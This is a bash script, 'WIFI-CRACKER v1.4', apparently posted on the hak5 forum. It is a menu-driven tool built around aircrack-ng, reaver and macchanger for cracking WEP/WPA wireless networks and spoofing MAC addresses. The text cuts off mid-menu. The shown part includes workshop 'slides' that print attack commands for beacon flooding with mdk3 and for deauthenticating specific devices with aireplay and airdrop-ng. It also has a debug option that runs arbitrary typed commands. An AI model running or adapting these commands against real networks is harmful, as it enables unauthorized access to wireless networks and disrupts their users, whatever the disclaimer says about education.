#!/bin/bash
# You can help by emailing @ andr920jhckrs+WC@gmail.com
# READ ABOUT FUNCTION!!!!!!
#~~~~~~~~~~~~~~~~~~~~ERROR CODES~~~~~~~~~~~~~~~~~
#EXIT 1 = not root
#EXIT 2 = dependencies
#EXIT 3 = after update
#EXIT 4 = normal exit, script over
#EXIT 5 = used quit
#EXIT ? = UNKNOWN ERROR PLEASE REPORT!!!
#======================================= VARIABLES =======================================#
#Colors
LG1='\033[0;40;32m'
LG2='\033[0;40;36m'
LG3='\033[0;40;31m'
MESSAGE='\033[0;0;33m'
CRITICAL='\033[0;0;31m'
INFO='\033[0;0;34m'
BANNER='\033[0;0;35m'
BLK='\033[0;40;37m'
RED='\033[0;41;30m'
STD='\033[0;0;39m'
#Variables
INTERFACE="wlan0"
CMAC="USED FOR CURRENT MAC"
INTERFACE2="mon0"
CMAC2="USED FOR CURRENT MAC"
UIF="${INTERFACE2}"
MACOPTION="-m ${MAC}"
MAC="00:11:22:33:44:55"
MONMODE="OFF"
MACINFO="OFF"
MACMODE="OFF"
BSSID="00:BB:CC:DD:EE:FF"
CHANNEL="7"
ESSID="linksys"
FILE="wifi-cracker"
FILE2="WPA PSK"
AIREPLAYPID="NOT RUNNING..."
AIRODUMPPID="NOT RUNNING..."
TERMINAL="gnome-terminal"
TERMCMD="USED BY TERMINAL COMMANDS"
KEY="NOTHING SAVED"
FILE3="tshark-output"
CONNECTION="NOTHING USEFUL YET"
#debugger mode (see commands)
S1=""
S2="set +x"
DBG="OFF"
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! FUNCTIONS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! DEBUGING  STUFF !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
debug() {
	show_logo
	get_mac
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  D E B U G - M E N U"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        Exit WIFI-CRACKER"
	echo -e "-------------------------------------------------"
	echo -e "Please choose an option :"	
	echo -e " 1.        Change Variables"
	echo -e " 2. UPDATE Current Mac on ${INTERFACE}  : ${CMAC}"
	echo -e "     and   Current Mac on ${INTERFACE2}   : ${CMAC2}"
	echo -e " 3.        CLEAN UP FILES"
	echo -e " 4.        Use Terminal Commands"
	echo -e " 5.        Check airmon-ng"
	echo -e " 6.        Check iwconfig"
	echo -e " 7.        Check ifconfig"
	echo -e " 8.        Check macchanger"
	echo -e " 9.        Check Internet"
	echo -e "10.        Turn ON Debug Mode (${DBG})"
	echo -e "11.        Turn OFF Debug Mode (${DBG})"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) changevar_menu ;;
		2) get_mac ;;
		3) clean_up ;;
		4) read -p "[$] ENTER YOUR TERMINAL COMMAND here : " TERMCMD & ${TERMCMD} & pause ;;
		5) echo -e "${MESSAGE}[$]: VIEWING airmon-ng : ${STD}" & airmon-ng & pause ;;
		6) echo -e "${MESSAGE}[$]: VIEWING iwconfig : ${STD}" & iwconfig & pause ;;
		7) echo -e "${MESSAGE}[$]: VIEWING ifconfig : ${STD}" & ifconfig & pause ;;
		8) echo -e "${MESSAGE}[$]: VIEWING macchanger -s : ${STD}" & macchanger -s ${INTERFACE} & pause ;;
		9) check_internet ;;
		10) dbg_on ;;
		11) dbg_off ;;
		"M") main_menu ;;
		"E") f_exit ;;
		"m") macspoof_info ;;
		"t") scout_menu ;;
		"c") crack_menu ;;
		"s") sniff_menu ;;
		"d") deauth_menu ;;
		hak5) hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	debug
}
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
changevar_menu() {
	show_logo
	get_mac
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  DEBUG MENU -> VARIABLES"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "Those are most of the variables of this script!"
	echo -e "most because there are local variables (CHOICE;CONFIRM;COMMAND;WIFI)"
	echo -e "DON'T MESS WITH THOSE UNLESS REALLY NEED TO!"
	echo -e ""
	echo -e "(~) *MENU* Back to debug"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        EXIT WIFI-CRACKER"
	echo -e "----------------------------------------"
	echo -e "Chose an option to change the variable : "
	echo -e " 1. Primary interface   : ${INTERFACE}"
	echo -e " 2. Target BSSID        : ${BSSID}"
	echo -e " 3. Target Channel      : ${CHANNEL}"
	echo -e " 4. Desired MAC         : ${MAC}"
	echo -e " 5. Current MAC         : ${CMAC}"
	echo -e " 6. Monitor interface   : ${INTERFACE2}"
	echo -e " 7. Save filename       : ${FILE}"
	echo -e " 8. WPA PSK savefile    : ${FILE2}"
	echo -e " 9. Target ESSID        : ${ESSID}"
	echo -e "10. Monitor Mode        : ${MONMODE}"
	echo -e "11. MAC INFO mode       : ${MACINFO}"
	echo -e "12. MAC Spoof mode      : ${MACMODE}"
	echo -e "13. Macchanger option   : ${MACOPTION}"
	echo -e "14. Aireplay PID        : ${AIREPLAYPID}"
	echo -e "15. Airodump PID        : ${AIRODUMPPID}"
	echo -e "16. Your terminal       : ${TERMINAL}"
	echo -e "17. Variable TERMCMD    : ${TERMCMD}"
	echo -e "18. WIFI KEY            : ${KEY}"
	echo -e "19. Tshark output name  : ${FILE3}"
	echo -e "20. Internet Connection : ${CONNECTION}"
	echo -e ""
	echo -e "DBG mode (${DBG}) : ${S1} ; ${S2}"
	echo -e ""
	echo -e "Script Argument 1 : ${1}"
	echo -e "Script Argument 2 : ${2}"
	echo -e "Script Argument 3 : ${3}"
	echo -e "Script Argument 4 : ${4}"
	echo -e "Script Argument 5 : ${5}"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		~) debug ;;
		M) main_menu ;;
		E) f_exit ;;
		1) read -p "Enter new Variable here : " INTERFACE & pause ;;
		2) read -p "Enter new Variable here : " BSSID & pause ;;
		3) read -p "Enter new Variable here : " CHANNEL & pause ;;
		4) read -p "Enter new Variable here : " MAC & pause ;;
		5) read -p "Enter new Variable here : " CMAC & pause ;;
		6) read -p "Enter new Variable here : " INTERFACE2 & pause ;;
		7) read -p "Enter new Variable here : " FILE & pause ;;
		8) read -p "Enter new Variable here : " FILE2 & pause ;;
		9) read -p "Enter new Variable here : " ESSID & pause ;;
		10) read -p "Enter new Variable here : " MONMODE & pause ;;
		11) read -p "Enter new Variable here : " MACINFO & pause ;;
		12) read -p "Enter new Variable here : " MACMODE & pause ;;
		13) read -p "Enter new Variable here : " MACOPTION & pause ;;
		14) read -p "Enter new Variable here : " AIREPLAYPID & pause ;;
		15) read -p "Enter new Variable here : " AIRODUMPPID & pause ;;
		16) read -p "Enter new Variable here : " TERMINAL & pause ;;
		17) read -p "Enter new Variable here : " TERMCMD & pause ;;
		18) read -p "Enter new Variable here : " KEY & pause ;;
		19) read -p "Enter new Variable here : " FILE3 & pause ;;
		20) read -p "Enter new Variable here : " CONNECTION & pause ;;
		quit|qqq) exit 5 ;;
		m) macspoof_info ;;
		t) scout_menu ;;
		c) crack_menu ;;
		s) sniff_menu ;;
		hak5) hak5WS_menu ;;
		d) deauth_menu ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	changevar_menu
}
###########################################################################################
dbg_on() {
	echo -e "" #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}########################ENABLING BASH DEBUGGING MODE########################${STD}"
	echo -e "${BANNER}####################look out for lines that start with +####################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	DBG="ON"
	S1="set -x"
	sleep 5
}
dbg_off() {
	echo -e "" #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}######################DISABLING BASH'S  DEBUGGING MODE######################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	DBG="OFF"
	S1="set +x"
	sleep 5
}
###########################################################################################
#=====================================OTHER FUNCTIONS=====================================#
###########################################################################################
###########################################################################################
coming_soon(){
show_logo
echo -e ""
echo -e "WORK IN PROGRESS; COMING SOON!!!"
pause
}
###########################################################################################
pause(){
  echo -e ""
  echo -e ""
  echo -e "Press [Enter] key to continue...${STD}"
  read fackEnterKey
  clear
}
###########################################################################################
check_internet() {

	local INTERNET
	INTERNET=$(ping google.com -c 5 2>&1 | grep -c "\<unknown\>")
	case ${INTERNET} in
		"0") CONNECTION="ON" ;;
		*) CONNECTION="OFF" & echo -e "${RED}Error...${STD}" & sleep 2
	esac
	case ${CONNECTION} in
		"ON") echo -e "${MESSAGE}[$]: INTERNET IS CONNECTED!${STD}";;
		"OFF")echo -e "${MESSAGE}[$]: YOU MUST BE CONNECTED TO THE INTERNET FOR THIS TO WORK!${STD}" & sleep 5 & main_menu ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & exit 69
	esac
}
###########################################################################################
clean_up() {
	local CLEAN
	echo -e "${CRITICAL}[!]: Would you to use clean up feature [Y/n]? ${STD}" & sleep 2
	read CLEAN
	if [ $CLEAN != "n" ]
	then
		local CONFIRM
		echo -e "${CRITICAL}[!]: Would you like WIFI-CRACKER to clean up it's files [Y/n]? ${STD}" & read CONFIRM
		case $CONFIRM in
			y|Y|YES|yes|Yes) 
			show_logo &
			echo -e "${INFO}[~]: CLEANING UP...${STD}" & ${S1} &
			kill ${AIRODUMPPID} &
			kill ${AIREPLAYPID} &
			rm *.ivs *.cap *.xor *.wpc & ${S2} &
			reset_mac &
			echo -e "${INFO}[~]: CLEANING UP...DONE${STD}" &
			sleep 3	;;
			*) echo -e "${MESSAGE}[$]: YOUR CHOICE, CONTINUING...${STD}" & sleep 2
		esac
		local CONFIRM
		echo -e "${CRITICAL}[!]: Would you like WIFI-CRACKER to delete dependencies [Y/n]? ${STD}" & read CONFIRM
		case $CONFIRM in
			y|Y|YES|yes|Yes) 
			show_logo &
			echo -e "${INFO}INFO: DELETING DEPENDENCIES...${STD}" & ${S1} &
			apt-get remove aircrack-ng macchanger reaver tshark wireshark & ${S2} &
			echo -e "${INFO}INFO: DELETING DEPENDENCIES...DONE${STD}" &
			sleep 3	;;
			*) echo -e "${MESSAGE}[$]: YOUR CHOICE, CONTINUING...${STD}" & sleep 2
		esac
		clear 
		sleep 2
		show_logo
		echo -e "${MESSAGE}[$]: CLEAN UP COMPLETED...${STD}" & pause
	else
		echo -e "${MESSAGE}[$]: USER SKIPPED CLEAN UP...${STD}" & sleep 2
	fi
	}
###########################################################################################
f_exit(){
	clean_up
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}#########################NOW EXITING WIFI-CRACKER###########################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e ""
	echo -e "${INFO}[~]: reseting wireless interface.${STD}"
	ifconfig ${INTERFACE} down
	echo -e "${INFO}[~]: reseting wireless interface..${STD}"
	ifconfig ${INTERFACE} up
	echo -e "${INFO}[~]: reseting wireless interface...DONE!${STD}"
	echo -e ""
	echo -e "${MESSAGE}[$]: IF YOUR WIFI STOPPED WORKING, TURN IT OFF THEN BACK ON${STD}"
	pause
	if [ `echo -e -n $USER` != "root" ]
	then
		exit 1
	fi
	if [ -z `which macchanger` ] || [ -z `which aircrack-ng` ] || [ -z `which reaver` ] || [ -z `which ${TERMINAL}` ]
	then 
		exit 2
	fi
	exit 4
}
###########################################################################################
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ WIFI WORKSHOP STUFF ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
hak5WS_menu() {
	show_logo
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  HAK5 WIFI WORKSHOP SLIDES  "
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "Pretty useful information and some cool demos for wifi fun!"
	echo -e "(creds to hak5 team and Darren Kitchen... ; also keep in mind the disclamer!)"
	echo -e ""
	echo -e " (~) *MENU* Back to debug"
	echo -e " (M) *MENU* Exit to main menu"
	echo -e " (E)        EXIT WIFI-CRACKER"
	echo -e "-----------------------------"
	echo -e "Please choose a slide :"
	echo -e " 1. Slide 1 << check available modes >>"
	echo -e " 2. Slide 2 << changing TX power >>"
	echo -e " 3. Slide 3 << beacon flooding >>"
	echo -e " 4. Slide 4 << wireshark >>"
	echo -e " 5. Slide 5 << connection to open AP >>"
	echo -e " 6. Slide 6 << deathentication >>"
	echo -e ""
	local choice
	read -p "Enter choice : " choice
	case $choice in
		~) debug ;;
		M) main_menu ;;
		E) f_exit ;;
		m) macspoof_info ;;
		t) scout_menu ;;
		c) crack_menu ;;
		s) sniff_menu ;;
		hak5) hak5WS_menu ;;
		d) deauth_menu ;;
		1) slide1 ;;
		2) slide2 ;;
		3) slide3 ;;
		4) slide4 ;;
		5) slide5 ;;
		6) slide6 ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	hak5WS_menu
}
###########################################################################################
slide1() {
show_logo
echo -e ""
echo -e "	Check modes"
echo -e ""
echo -e "root:-# iw phy phy5 info | grep -A8 modes"
pause
}
###########################################################################################
slide2() {
show_logo
echo -e ""
echo -e "	changing TX power"
echo -e ""
echo -e "root:-# iw reg get"
echo -e "root:-# iw reg set BO ##bolivia##"
echo -e "root:-# iwconfig wlan0 txpower 30"
pause
}
###########################################################################################
slide3() {
show_logo
echo -e ""
echo -e "	Beacon Flooding"
echo -e ""
echo -e "root:-# cat << EOF > ssidlist.txt"
echo -e ">kitten"
echo -e ">linksys"
echo -e ">netgear"
echo -e ">pineapple"
echo -e ">peewee"
echo -e ">apt204"
echo -e ">free-weed"
echo -e ">duck"
echo -e ">immigration"
echo -e ">hackme"
echo -e ">fbi-van"
echo -e ">free-candyu"
echo -e ">EOF"
echo -e ""
echo -e "root:-# mdk3 mon0 b -f ssidlist.txt"
pause
}
###########################################################################################
slide4() {
show_logo
echo -e ""
echo -e "	Wireshark"
echo -e ""
echo -e "root:-# gksudo wikeshark & disown"
echo -e ""
echo -e "      #Filter!/*wlan.fc.subtype == 0x08*\"
pause
}
###########################################################################################
slide5() {
show_logo
echo -e ""
echo -e "	Connection to Open AP"
echo -e ""
echo -e "# start wireshark on wlan2"
echo -e "  #Filter!/*wlan.addr == 00:c0:ca:54:51:ef (BSSID) and not wlan.fc.subtybe == 0x08 (beacon)*\"
echo -e ""
echo -e "   Passive scan (not frames)"
echo -e "root:-# iw dev wlan0 scan passive | grep SSID"
echo -e ""
echo -e "   Active scan"
echo -e "root:-# iw wlan0 scan | grep SSID"
echo -e ""
echo -e "   wireshark filters"
echo -e "Beacon   : 0x08"
echo -e "Requests : 0x04"
echo -e "Responses: 0x05"
echo -e ""
echo -e "    Connecting"
echo -e ""
echo -e "root:-# airmon-ng start wlan0"
echo -e "root:-# airodump-ng mon0"
echo -e "#get channel"
echo -e "root:-# iwconfig wlan0 channel 11 & iwconfig mon0 channel 11"
echo -e "root:-# iwconfig wlan0 | grep Frequency"
echo -e "root:-# gksudo wireshark & disown"
echo -e ""
pause
}
###########################################################################################
slide6() {
show_logo
echo -e ""
echo -e "	DEATHENTICATION"
echo -e ""
echo -e "    Deathenticate my phone!"
echo -e ""
echo -e "root:-# iwconfig mon0 channel 11"
echo -e "root:-# aireplay -0 99 -a 00:C0:CA:60:53:2E -c A0:0B:BA:BA:6A:CA mon0"
echo -e "-0 is Death; -1 is Auth; -2 is ??? )"
echo -e ""
echo -e "    Hella DEATH"
echo -e ""
echo -e "root:-# cat << ## > droprules"
echo -e "root:-# cat droprules"
echo -e "a/00:c0:ca:60:53:2e|any"
echo -e "d/any|any"
echo -e "root:-# airodump-ng --output-format csv --write dump mon0"
echo -e "root:-# airdrop-ng -i mon0 -t dump.csv-01.csv -r droprules"
pause
}
###########################################################################################
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
###########################################################################################
show_logo() {
	clear
	echo -e "${LG1} ___________________________________________________________________________ ${STD}"
	echo -e "${LG1}| _    _ ___________ _____ ${LG2}AUTHOR${LG1} ___________  ___  _____ _   _____________ |${STD}"
	echo -e "${LG1}|| |  | |_   _|  ___|_   _| ${LG2}root${LG1} /  __ \ ___ \/ _ \/  __ \ | / /  ___| ___ \|${STD}"
	echo -e "${LG1}|| |  | | | | | |_    | | ______ | /  \/ |_/ / /_\ \ /  \/ |/ /| |__ | |_/ /|${STD}"
	echo -e "${LG1}|| |/\| | | | |  _|   | ||______|| |   |    /|  _  | |   |    \|  __||    / |${STD}"
	echo -e "${LG1}|\  /\  /_| |_| |    _| |_       | \__/\ |\ \| | | | \__/\ |\  \ |___| |\ \ |${STD}"
	echo -e "${LG1}| \/  \/ \___/\_|    \___/ ${LG3}*v1.4*${LG1} \____|_| \_\_| |_/\____|_| \_|____/\_| \_||${STD}"
	echo -e "${LG1}|___________________________________________________________________________|${STD}"
}
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! START UP FUNCTIONS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
disclaimer() {
	clear
	show_logo
	echo -e "${RED}"
	echo -e "DISCLAIMER :"	
	echo -e "I don't own the programs used in this script"
	echo -e "(macchanger;aircrack-ng;reaver;tshark;wireshark;wget;etc..)"
	echo -e ""
	echo -e "WIFI-CRACKER IS A SCRIPT DESIGNED TO AUTOMATE THE PROCESS OF CRACKING YOUR"
	echo -e "WIRELESS NETWORK AND WAS CREATED FOR EDUCATIONNAL PURPOSES. I AM NOT IN ANY"
	echo -e "WAY RESPONSIBLE FOR ANY CRIMES YOU COMMIT USING THIS SCRIPT!"
	echo -e "${STD}"
	echo -e "${LG3}ALSO IF YOU SEE THIS ON ANY OTHER FORUM THAN HAK5 THEN ITS NOT ME;"
	echo -e "TO THE PEOPLE REPOSTING MY CODE, DONT FORGET TO GIVE CREDS -_- ${STD}"
	echo -e "${STD}"
	pause
	loading
}
###########################################################################################
loading() {
	show_logo
	echo -e "${RED}"
	echo -e "DISCLAIMER :"	
	echo -e "I don't own the programs used in this script"
	echo -e "(macchanger;aircrack-ng;reaver;tshark;wireshark;wget;etc..)"
	echo -e ""
	echo -e "WIFI-CRACKER IS A SCRIPT DESIGNED TO AUTOMATE THE PROCESS OF CRACKING YOUR"
	echo -e "WIRELESS NETWORK AND WAS CREATED FOR EDUCATIONNAL PURPOSES. I AM NOT IN ANY"
	echo -e "WAY RESPONSIBLE FOR ANY CRIMES YOU COMMIT USING THIS SCRIPT!"
	echo -e "${STD}"
	echo -e "${LG3}ALSO IF YOU SEE THIS ON ANY OTHER FORUM THAN HAK5 THEN ITS NOT ME;"
	echo -e "TO THE PEOPLE REPOSTING MY CODE, DONT FORGET TO GIVE CREDS -_- ${STD}"
	echo -e "${STD}"
	echo -e "[Traping exit keys] LOADING..." & sleep 1
	echo -e "[.                ] LOADING..." & sleep 0.5
	echo -e "[..               ] LOADING..." & sleep 0.3
	echo -e "[...              ] LOADING..." & sleep 0.4	
	echo -e "[....             ] LOADING..." & sleep 0.4	
	echo -e "[.....            ] LOADING..." & sleep 0.3
	echo -e "[......           ] LOADING..." & sleep 0.3	
	echo -e "[.......          ] LOADING..." & sleep 0.2			
	trap '' SIGINT SIGQUIT SIGTSTP
	echo -e "[........         ] LOADING..." & sleep 0.1	
	echo -e "[.........        ] LOADING..." & sleep 0.05	
	echo -e "[..........       ] LOADING..." & sleep 0.05	
	echo -e "[...........      ] LOADING..." & sleep 0.05	
	echo -e "[............     ] LOADING..." & sleep 0.05	
	echo -e "[.............    ] LOADING..." & sleep 0.1	
	echo -e "[..............   ] LOADING..." & sleep 0.01	
	echo -e "[...............  ] LOADING..." & sleep 0.01	
	echo -e "[................ ] LOADING..." & sleep 0.01
}
###########################################################################################
check_root() {
	show_logo
	echo -e "${INFO}[~]: Performing start up checks...${STD}"
	echo -e "${INFO}[~]: Begin start up routine${STD}"
	echo -e "" #BANNER: 
	echo -e "${BANNER}#################################################################${STD}"
	echo -e "${BANNER}#######################CHECKING FOR ROOT#########################${STD}"
	echo -e "${BANNER}#################################################################${STD}"
	echo -e ""
	if [ `echo -e -n $USER` != "root" ]
	then
		while true
		do
			echo -e "${RED}ERROR: Please run as root!${STD}"
			echo -e "${CRITICAL}[!]: You can either exit and run again through sudo ./filename.sh${STD}"
			echo -e "${CRITICAL}[!]: Or type 1 and WIFI-CRACKER WILL REQUEST ROOT (by sudo -s)${STD}"
			echo -e ""
			echo -e "1. Attempt to get root"
			echo -e "2. Exit WIFI-CRACKER"
			echo -e ""		
			local choice
			read -p "Enter choice [ 1 - 2 ] " choice
			case $choice in
				1) echo -e "${MESSAGE}[$]: Type your password (check the code if you're afraid it's logged)" & echo -e "${MESSAGE}[$]: Then run the script again${STD}" & echo -e "" & sudo -s ;;
				2) f_exit ;;
				*) echo -e "${RED}Error...${STD}" & sleep 2 & pause ;;
			esac
		done
	fi
	echo -e "${INFO}[~]: root access level confirmed!${STD}"
	pause
}
###########################################################################################
check_dep() {	
	show_logo
	echo -e "${INFO}[~]: Performing start up checks...${STD}"
	echo -e "${INFO}[~]: Begin start up routine${STD}"	
	echo -e "${INFO}[~]: root...............VERIFIED!${STD}"
	echo -e "" #BANNER: 
	echo -e "${BANNER}#################################################################${STD}"
	echo -e "${BANNER}######################CHECKING DEPENDENCIES######################${STD}"
	echo -e "${BANNER}########currently aircrack-ng;macchanger;reaver;wireshark########${STD}"
	echo -e "${BANNER}#################################################################${STD}"
	echo -e ""
	if [ -z `which xterm` ] || [ -z `which gnome-terminal` ]
	then
		while true
		do
			echo -e "Which terminal do you prefer?"
			echo -e "1. Gnome-terminal"
			echo -e "2. XTerm"
			echo -e "3. Enter your own terminal name"
			local choice		
			read -p "Enter choice [ 1 - 3 ] " choice
			case $choice in
				1) TERMINAL="gnome-terminal" ;;
				2) TERMINAL="xterm" ;;
				3) echo -e "${CRITICAL}[?]: Which one do you have? ${STD}" & read TERMINAL ;;
				*) echo -e "${CRITICAL}[!]: YOU MUST CHOOSE A TERMINAL TO USE!${STD}" ;;
			esac
			local CONFIRM
			echo -e "${MESSAGE}[$]: You choose this terminal for WIFI-CRACKER : ${TERMINAL}${STD}"
			echo -e "${CRITICAL}[?]: Is this information corrent [Y/n]? " & read CONFIRM
			case $CONFIRM in
				y|Y|YES|yes|Yes) break ;;
				*) echo -e "${CRITICAL}[!]: Please re-enter information${STD}" ;;
			esac
		done
	fi
	echo -e ""
	if [ -z `which macchanger` ] || [ -z `which aircrack-ng` ] || [ -z `which reaver` ] || [ -z `which tshark` ] || [ -z `which wireshark` ]
	then echo -e "${CRITICAL}[!]: One or more of the dependencies are not installed.${STD}"
		local CONFIRM
		echo -e "${CRITICAL}[?]: Would you like WIFI-CRACKER to install them [Y/n]? ${BLK}"
		read CONFIRM
		echo -e "${STD}"
		sleep 0.01
		case $CONFIRM in
			y|Y|YES|yes|Yes) ${S1} & check_internet & sleep 1 & apt-get update & apt-get install aircrack-ng macchanger reaver tshark wireshark ${TERMINAL} & ${S2} & check_dep ;;
			*) echo -e "${CRITICAL}[!]: YOU MUST HAVE THE DEPENDENCIES FOR WIFI-CRACKER TO RUN!${STD}" & f_exit
		esac
	fi

	echo -e "${INFO}[~]: Dependencies confirmed!${STD}"
	pause
}
###########################################################################################
check_arg() {
	show_logo
	echo -e "${INFO}[~]: Performing start up checks...${STD}"
	echo -e "${INFO}[~]: Begin start up routine${STD}"
	echo -e "${INFO}[~]: root...............VERIFIED!${STD}"
	echo -e "${INFO}[~]: dependencies.......VERIFIED!${STD}"
	echo -e "" #BANNER: 
	echo -e "${BANNER}#################################################################${STD}"
	echo -e "${BANNER}###############CHECKING IF AGRUMENTS WERE PROVIDED###############${STD}"
	echo -e "${BANNER}#################################################################${STD}"
	echo -e ""
	if [ -z ${1} ] || [ -z ${2} ] || [ -z ${3} ] || [ -z ${4} ]
	then
		echo -e "${INFO}[~]: You haven't provided all arguments${STD}"
		echo -e "${MESSAGE}[$]: It's just another method of using this script${STD}"
		echo -e "${MESSAGE}[$]: Usage: `basename ${0}` [interface] [BSSID] [channel] [MAC]${STD}"
		echo -e "${MESSAGE}[$]: Example #`basename ${0}` wlan0${STD}"
		echo -e "${MESSAGE}[$]: If you see this, you will have to manually enter those later${STD}"
	else
		INTERFACE="`echo -e "${1}" `"
		BSSID="`echo -e "${2}" `"
		CHANNEL="`echo -e "${3}" `"
		MAC="`echo -e "${4}" `"
		echo -e "${MESSAGE}[$]: You provided all the arguments${STD}"
		echo -e "${INFO}[~]: Your primary interface is       :${BLK} ${INTERFACE}${STD}"
		echo -e "${INFO}[~]: Your Target BSSID is	     :${BLK} ${BSSID}${STD}"
		echo -e "${INFO}[~]: Your Target channel is	     :${BLK} ${CHANNEL}${STD}"
		echo -e "${INFO}[~]: Your desired MAC Address is     :${BLK} ${MAC}${STD}"
		MACINFO="ON"
	fi
	pause
}
###########################################################################################
last_stp_msg() {
	show_logo
	echo -e "${INFO}[~]: Performing start up checks...${STD}"
	echo -e "${INFO}[~]: Begin start up routine${STD}"
	echo -e "${INFO}[~]: root...............VERIFIED!${STD}"
	echo -e "${INFO}[~]: dependencies.......VERIFIED!${STD}"
	echo -e "${INFO}[~]: script arguments...VERIFIED!${STD}"
	get_mac
	echo -e "${INFO}[~]: current mac.......RETRIEVED!${STD}"   
	pause
}
###########################################################################################
about() {
	show_logo
	echo -e ""
	echo -e "CHANGE LOG :"
#	echo -e "*ALPHA-v0.1* ABILITY TO CHANGE MAC"
#	echo -e "*ALPHA-v0.1* ABILITY TO SCOUT FOR TARGETS"
#	echo -e "*ALPHA-v0.1* ABILITY TO CRACK A WEP PROTECTED NETWORK"
#	echo -e "*ALPHA-v0.2* ORGANIZED IN FUNCTIONS, CLEAN UP CODE, NOW MENU DRIVEN"
#	echo -e "*ALPHA-v0.3* SCOUTING MENU DONE; CRACKING MENU IN PROGRESS (+WPA)"
#	echo -e "*ALPHA-v0.4* MAC SPOOF NOW HAS OPTIONS AND MENU"
#	echo -e "*BETA -v0.5* CRACKING ALMOST DONE(+WEP PASSIVE); STARTED CLEANUP AND DEBUG"
#	echo -e "*BETA -v0.6* ADDED ABOUT SCREEN; ADDED TERMINAL CHOICE"
#	echo -e "*BETA -v0.7* CRACKING MENU(+CRACK FILE & AIRCRACK CONTROL)"
#	echo -e "*BETA -v0.8* DEBUG MENU ALMOST COMPLETE; CAN CONTROL TERMINAL FROM DEBUG MENU"
#	echo -e "*BETA -v0.9* CRACKING FINISHED (FRAGMENTATION ATTACK ADDED)"
#	echo -e "*FINAL-v1.0* FINISHED DEBUG MENU; ADDED DOWNLOAD INFO"
	echo -e "*v1.0* FIRST PUBLIC RELEASE"
#	echo -e "*v1.1* LOTS OF FIXES (TYPOS+CHECKS+etc.); OPTION TO ASK FOR ROOT"
	echo -e "*v1.2* FIXES; ADDED PACKET SNIFFING MENU; ADDED UPDATE FUNCTION"
#	echo -e "*v1.2.2* FIXED MAJOR ISSUE WITH CRACKING FROM FILE METHODS AND SOME TYPOS"
#	echo -e "*v1.2.3* FIXED LOTS OF BUGS ; MADE WPA CRACKING BETTER ; ADDED CONTINUE REAVER SESSION"
	echo -e "*v1.3*$ FIXED STUFF ; ADDED COLOR ; SORTED OUTPUT ; ADDED COMMAND OUTPUT via DBG MODE in ~"
	echo -e "${RED}*v1.4*(dev_b3)${INFO} MADE SOME CHANGES WITH THE MENU; WORKING ON DEAUTH MENU!! ${STD}"
	echo -e "*TODO* FIX SCRIPT ARGUMENTS ; FINISH DEAUTH MENU"
	echo -e ""
	echo -e "ORIGINAL NAME  : WIFI-CRACKER-by-root.sh"
	echo -e "CURRENT NAME   : `basename ${0}`"	
	echo -e "AUTHOR         : root920/andr920"	
	echo -e "LATEST VERSION : v1.4 - ${LG3}DEV_b3${STD}"	
	echo -e "LAST RELEASE   : Fri 3rd May 2013 - 23:20"
	echo -e ""
	echo -e "You can always download the newest version of this script here:"
	echo -e "http://db.tt/lNOstZya"
	echo -e "OR use the built-in updater"
	echo -e ""
	echo -e "If you have any issues email me at : andr920jhckrs+WC@gmail.com"	
	pause
}
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! MAIN FUNCTIONS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
start_up() {
	disclaimer
	local loading		
	echo -e "${CRITICAL}[.................] DONE, PRESS [ENTER] TO CONTINUE...${STD}" & read loading
	if [ $loading = "skip" ]
	then
		main_menu
	fi			
	check_root
	check_dep
	check_arg
	last_stp_msg
	about
	main_menu
}
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
main_menu() {
	show_logo
	echo -e "~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  M A I N - M E N U"
	echo -e "~~~~~~~~~~~~~~~~~~~~~"
	echo -e "Please choose an option :"
	echo -e "(m) *MENU* Mac spoofer"
	echo -e "(t) *MENU* Target scouting"
	echo -e "(c) *MENU* Cracking"
	echo -e "(s) *MENU* Packet Sniffing "
	echo -e "(d) *MENU* DAuth ${RED}[WIP]${STD}     ${INFO}*NEW*${STD}"
	echo -e "(U) UPDATE WIFI-CRACKER    "
	echo -e "(D) CHECK FOR DEPENDENCIES "
